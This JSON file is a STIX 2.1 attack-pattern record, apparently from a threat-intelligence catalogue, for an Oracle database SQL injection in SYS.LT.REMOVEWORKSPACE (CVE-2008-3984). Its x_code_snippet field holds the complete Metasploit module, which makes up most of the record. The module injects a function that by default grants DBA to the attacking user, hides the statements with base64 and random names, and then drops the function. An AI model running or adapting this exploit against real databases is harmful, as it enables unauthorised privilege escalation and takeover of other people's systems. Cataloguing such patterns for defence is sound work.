{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--febb1e75-2b1b-4ffb-93cc-b7e750d2c394",
    "created": "2024-08-14T16:22:14.890425Z",
    "modified": "2024-08-14T16:22:14.890429Z",
    "name": "Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE",
    "description": " This module exploits a sql injection flaw in the REMOVEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/lt_removeworkspace.rb",
            "external_id": "lt_removeworkspace.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3984"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE',\n      'Description'    => %q{\n        This module exploits a sql injection flaw in the REMOVEWORKSPACE\n        procedure of the PL/SQL package SYS.LT. Any user with execute\n        privilege on the vulnerable package can exploit this vulnerability.\n      },\n      'Author'         => [ 'Sh2kerr <research[ad]dsecrg.com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-3984' ],\n          [ 'OSVDB', '49326']\n        ],\n      'DisclosureDate' => '2008-10-13'))\n\n      register_options(\n        [\n          OptString.new('SQL', [ false, 'SQL to execte.',  \"GRANT DBA to #{datastore['DBUSER']}\"]),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    cruft = Rex::Text.rand_text_alpha_upper(1)\n\n    function = \"\n      CREATE OR REPLACE FUNCTION #{cruft}\n      RETURN VARCHAR2 AUTHID CURRENT_USER\n      AS\n      PRAGMA AUTONOMOUS_TRANSACTION;\n      BEGIN\n      EXECUTE IMMEDIATE '#{datastore['SQL']}';\n      COMMIT;\n      RETURN '#{cruft}';\n      END;\"\n\n    package1 = %Q|\n      BEGIN\n        SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');\n      END;\n      |\n\n    package2 = %Q|\n      BEGIN\n        SYS.LT.REMOVEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');\n      END;\n      |\n\n    uno  = Rex::Text.encode_base64(function)\n    dos  = Rex::Text.encode_base64(package1)\n    tres = Rex::Text.encode_base64(package2)\n\n    sql = %Q|\n      DECLARE\n      #{rand1} VARCHAR2(32767);\n      #{rand2} VARCHAR2(32767);\n      #{rand3} VARCHAR2(32767);\n      BEGIN\n      #{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{uno}')));\n      EXECUTE IMMEDIATE #{rand1};\n      #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));\n      EXECUTE IMMEDIATE #{rand2};\n      #{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{tres}')));\n      EXECUTE IMMEDIATE #{rand3};\n      END;\n      |\n\n    clean = \"DROP FUNCTION #{cruft}\"\n\n    # Try first, if it's good.. keep doing the dance.\n    print_status(\"Attempting sql injection on SYS.LT.REMOVEWORKSPACE...\")\n    begin\n      prepare_exec(sql)\n    rescue => e\n      return\n    end\n\n    print_status(\"Removing function '#{cruft}'...\")\n    prepare_exec(clean)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-13"
}